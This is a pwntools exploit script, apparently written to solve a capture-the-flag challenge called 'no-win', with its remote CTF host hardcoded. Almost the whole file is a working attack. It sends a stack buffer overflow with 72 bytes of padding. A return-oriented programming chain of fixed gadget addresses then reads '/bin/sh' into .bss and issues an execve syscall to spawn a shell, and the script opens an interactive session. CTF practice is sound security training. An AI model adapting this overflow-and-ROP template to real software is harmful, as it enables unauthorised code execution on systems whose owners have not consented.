#!/usr/bin/env python3

from pwn import *

exe = ELF('no-win', checksec=False)
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
context.binary = exe
context.terminal = [ '/mnt/c/Windows/System32/cmd.exe', '/c', 'start', 'wt.exe', '-w', '0', 'split-pane', '--size', '0.6', '-d', '.', 'wsl.exe','-d', 'Parrot', 'bash', '-c' ]

debug = lambda msg: log.debug(msg)
info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
error = lambda msg: log.error(msg)
critical = lambda msg: log.critical(msg)
warning = lambda msg: log.warning(msg)

s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())

def GDB():
    if not args.REMOTE and not args.DOCKER:
        gdb.attach(p, gdbscript='''
        set follow-fork-mode parent
        b*0x000000000040196e



        c
        ''')
        input()

if args.REMOTE:
    p = remote('no-win-scenario-e4a24f719b7f.chall.nnsc.tf', 1337, ssl=True)
elif args.DOCKER:
    p = remote('')
else:
    p = process([exe.path])
    
GDB()
'''
0x0000000000402128 : pop rdi ; pop rbp ; ret
0x000000000040a3c2 : pop rsi ; pop rbp ; ret
0x0000000000413210 : pop rdx ; ret
0x0000000000427eeb : pop rax ; ret
0x0000000000401324 : syscall
'''

pop_rdi = 0x0000000000402128
pop_rsi = 0x000000000040a3c2
pop_rdx = 0x0000000000413210
pop_rax = 0x0000000000427eeb
syscall = 0x0000000000401324
bss = exe.bss() + 0x500   
payload = flat(
    cyclic(72),

    pop_rax, 0, 
    pop_rdi, 0, 0, 
    pop_rsi, bss, 0,  
    pop_rdx, 8, 
    exe.sym.read,

    pop_rax, 0x3b, 
    pop_rdi, bss, 0, 
    pop_rsi, 0, 0, 
    pop_rdx, 0, 
    syscall,
)
sla(b'> ', payload)
s(b'/bin/sh\0')

p.interactive()